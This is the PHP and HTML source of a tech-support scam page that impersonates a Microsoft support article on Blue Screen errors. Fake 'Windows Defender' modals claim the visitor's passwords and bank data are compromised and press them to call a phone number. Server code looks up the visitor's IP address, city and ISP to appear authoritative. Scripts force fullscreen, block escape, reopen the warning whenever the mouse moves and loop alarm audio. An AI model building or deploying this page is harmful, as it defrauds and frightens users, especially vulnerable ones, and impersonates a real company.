<?php $bcda = "+1 585 573 3173"; ?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Resolving Blue Screen Errors</title>

  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css" rel="stylesheet"/>

  <!-- Custom CSS for Modal Sizes -->
  <style>
    .modal-400x600 {
      max-width: 500px;
    }

    .modal-400x600 .modal-content {
      height: auto;
    }

    .modal-400x400 {
      max-width: 600px;
    }

    .modal-400x400 .modal-content {
      height: auto;
    }

    #exampleModal2 {
      z-index: 1061;
    }

    .modal-dialog {
      margin: auto;
    }
  </style>
</head>
<body>

<!-- Navbar -->
<nav class="navbar navbar-expand-lg navbar-light bg-light border-bottom">
  <div class="container">
    <a class="navbar-brand" href="#">
      <img src="https://via.placeholder.com/100x40" alt="Microsoft Logo" height="40"/>
    </a>
    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav ms-auto">
        <li class="nav-item"><a class="nav-link" href="#">Support</a></li>
        <li class="nav-item"><a class="nav-link" href="#">Microsoft 365</a></li>
        <li class="nav-item"><a class="nav-link" href="#">Office</a></li>
        <li class="nav-item"><a class="nav-link" href="#">Products</a></li>
        <li class="nav-item"><a class="nav-link" href="#">Devices</a></li>
        <li class="nav-item"><a class="nav-link" href="#">Account & Billing</a></li>
        <li class="nav-item"><a class="btn btn-primary btn-sm" href="#">Buy Microsoft 365</a></li>
      </ul>
    </div>
  </div>
</nav>

<!-- Main Content -->
<div class="container mt-5">
  <div class="row">
    <div class="col-md-4 text-center">
      <div class="card p-4 shadow">
        <p class="mb-3">You’re invited to try Microsoft 365 for free</p>
        <button onclick="openModal1()" class="btn btn-primary mb-2">Unlock Now</button>
      </div>
    </div>

    <div class="col-md-12">
      <h1 class="mb-4">Resolving Blue Screen errors in Windows</h1>
      <p>
        Blue Screen errors (also called <strong>bug checks</strong>, <strong>STOP code errors</strong>, <strong>kernel errors</strong>, or <strong>BSOD errors</strong>) can occur if a serious problem causes Windows to shut down or restart unexpectedly to protect itself from data loss.
      </p>
      <img src="bsod.png" alt="bsod" class="img-fluid"/>
      <p>
        A hardware device, its driver, or software might have caused this error. To help determine the cause, the blue screen error might display a STOP code, such as PAGE_FAULT_IN_NONPAGED_AREA.
      </p>
    </div>

    <div class="col-md-12">
      <h3>Basic Troubleshooting Steps for Blue Screen Errors</h3>
      <ol>
        <li>Remove any new hardware...</li>
        <li>Start your PC in safe mode...</li>
        <li>Check the Device Manager...</li>
        <li>Check for sufficient free space...</li>
        <li>Install the latest Windows Updates...</li>
        <li>Try the Blue Screen Troubleshooter...</li>
        <li>Run on browser if not on Windows...</li>
        <li>Restore Windows if none help...</li>
      </ol>
    </div>
  </div>
</div>

<!-- Footer -->
<footer class="bg-light text-muted py-4 border-top mt-5">
  <div class="container">
    <div class="row">
      <div class="col-md-4 mb-3">
        <h6 class="text-uppercase fw-bold">Support</h6>
        <ul class="list-unstyled">
          <li><a href="#" class="text-decoration-none text-muted">Help Center</a></li>
          <li><a href="#" class="text-decoration-none text-muted">Contact Us</a></li>
          <li><a href="#" class="text-decoration-none text-muted">Feedback</a></li>
        </ul>
      </div>
      <div class="col-md-4 mb-3">
        <h6 class="text-uppercase fw-bold">Products</h6>
        <ul class="list-unstyled">
          <li><a href="#" class="text-decoration-none text-muted">Microsoft 365</a></li>
          <li><a href="#" class="text-decoration-none text-muted">Office</a></li>
          <li><a href="#" class="text-decoration-none text-muted">Windows</a></li>
        </ul>
      </div>
      <div class="col-md-4 mb-3">
        <h6 class="text-uppercase fw-bold">Follow Us</h6>
        <ul class="list-inline">
          <li class="list-inline-item"><a href="#" class="text-decoration-none text-muted"><i class="bi bi-facebook"></i> Facebook</a></li>
          <li class="list-inline-item"><a href="#" class="text-decoration-none text-muted"><i class="bi bi-twitter"></i> Twitter</a></li>
          <li class="list-inline-item"><a href="#" class="text-decoration-none text-muted"><i class="bi bi-linkedin"></i> LinkedIn</a></li>
        </ul>
      </div>
    </div>
    <div class="text-center pt-3 border-top">
      <p class="mb-0">&copy; 2025 Microsoft. All Rights Reserved.</p>
    </div>
  </div>
</footer>

<!-- Modal 1 -->
<div class="modal fade" id="exampleModal1" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered modal-400x600">
    <div class="modal-content bg-primary text-white">
      <div class="modal-header">
        <h5 class="modal-title">Important Notice</h5>
        <button type="button" class="btn-close" data-bs-dismiss=""></button>
      </div>
      <div class="modal-body">
        <h5>Windows-Defender - Security Warning<br></h5>
        <p><b>Access to this system is blocked for security reasons !</b></p>
        <p>Your computer has been reported to be infected with Malicious dangers. The following data was compromised: </p>
       <p>&gt; Email ID <br>&gt; Bank Password <br>&gt; Facebook Login <br>&gt; Photos and Documents </p>
       <p>Windows Defender scan found adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
       <p>Please contact us immediately. Our engineer will guide you through the removal process over the phone. </p>
       <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
       <p>Closing this window may put your personal information at risk and may cause your Windows registration to be suspended. </p>
      <p style="padding-bottom:0;color:#fff;font-size:16px">Call Windows Support: <strong>
          <span style="border:0px solid #fff;border-radius:5px;padding:5px 5px"> <br>Call us directly  <?php echo $bcda ?>
          </span>
        </strong>
      </p>
      
      <div class="modal-footer">
        <!--<button class="btn btn-secondary" data-bs-dismiss="modal">Close</button>-->
        <div class="d-grid gap-2 d-md-flex justify-content-md-end">
          <a class="btn btn-outline-light me-md-2" type="button">OK</a>
          <a class="btn btn-outline-light" type="button">cancel</a>
        </div>
      </div>
    </div>
      
      </div>
    </div>
  </div>
</div>

<!-- Modal 2 -->
<div class="modal fade" id="exampleModal2" tabindex="-1" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered modal-400x400">
    <div class="modal-content">
      <div class="modal-header">
        <img src="security.webp" width="20">
        <h5 class="modal-title ms-2">Windows Defender - Security Warning</h5>
        
        <button type="button" class="btn-close" data-bs-dismiss=""></button>
      </div>
      <div class="modal-body text-center fw-bold">
        <div class="text-danger fw-semibold">
            <?php
                // Get visitor IP address
                $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
                      $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
                      $_SERVER['REMOTE_ADDR'];
                
                // Fetch geolocation data from ip-api
                $geoData = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
                
                if ($geoData && $geoData->status === 'success') {
                    $city = $geoData->city;
                    $state = $geoData->regionName;
                    $country = $geoData->country;
                    $timezone = $geoData->timezone;
                    $isp      = $geoData->isp;
                
                    // Set timezone based on IP
                    date_default_timezone_set($timezone);
                    $localTime = date("Y-m-d H:i:s");
                
                    echo "Address IP : ".$ip." ".$localTime."<br>";
                    echo "City : ". $city." ".$country."<br>";
                    echo "ISP : $isp<br>";
                } else {
                    //echo "Unable to fetch location and time data.";
                }
            ?>

        </div>
        <img src="re.gif" class="my-3"/>
        <p>Access to this system is blocked for security reasons.</p>
        <p class="text-primary">Please call Windows Support:</p>
        <div class="text-primary border rounded-pill mx-auto p-2" style="width: 300px;">
          <img src="winlo.png" width="25" alt=""> &nbsp; Call us directly: <?php echo $bcda ?>
        </div>
      </div>
      <div class="modal-footer d-flex justify-content-between w-100">
        <span><img src="msmm.png" width="20" /> <strong>Windows</strong></span>
        <div>
          <button class="btn btn-outline-dark btn-sm" id="allow-btn" data-bs-dismiss="modal">Allow</button>
          <button class="btn btn-primary btn-sm" id="allow-btn" data-bs-dismiss="modal">Deny</button>
          <!--audio file -->
          <audio id="alertAudio" loop>
            <source src="audio-file.mp3" type="audio/mpeg" />
            Your browser does not support the audio element.
          </audio>
          <!-- end audio file -->
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Bootstrap Bundle -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

<!-- Modal Scripts -->
<script>
  let modal1, modal2;
  let modal2Dismissed = false;
  let audio = new Audio("audio-file.mp3");
  audio.loop = true;

  function openModal1() {
    modal1 = new bootstrap.Modal(document.getElementById('exampleModal1'), {
      backdrop: 'static',
      keyboard: false
    });
    modal1.show();
  }

  function openModal2() {
    modal2 = new bootstrap.Modal(document.getElementById('exampleModal2'), {
      backdrop: 'static',
      keyboard: false
    });
    modal2.show();
  }

  function requestFullscreen() {
    const elem = document.documentElement;
    if (!document.fullscreenElement) {
      if (elem.requestFullscreen) {
        elem.requestFullscreen();
      } else if (elem.webkitRequestFullscreen) {
        elem.webkitRequestFullscreen();
      } else if (elem.msRequestFullscreen) {
        elem.msRequestFullscreen();
      }
    }
  }

  document.addEventListener('DOMContentLoaded', function () {
    openModal1();
    setTimeout(openModal2, 300);
  });

  document.getElementById('exampleModal2').addEventListener('hidden.bs.modal', () => {
    modal2Dismissed = true;
  });

  document.addEventListener('mousemove', () => {
    if (modal2Dismissed) {
      openModal2();
      modal2Dismissed = false;
    }
  });

  document.addEventListener('click', function (e) {
    if (e.target && e.target.id === 'allow-btn') {
      audio.play();
    }
    requestFullscreen();
  });

  document.addEventListener('fullscreenchange', function () {
    if (!document.fullscreenElement) {
      requestFullscreen();
    }
  });
</script>




</body>
</html>
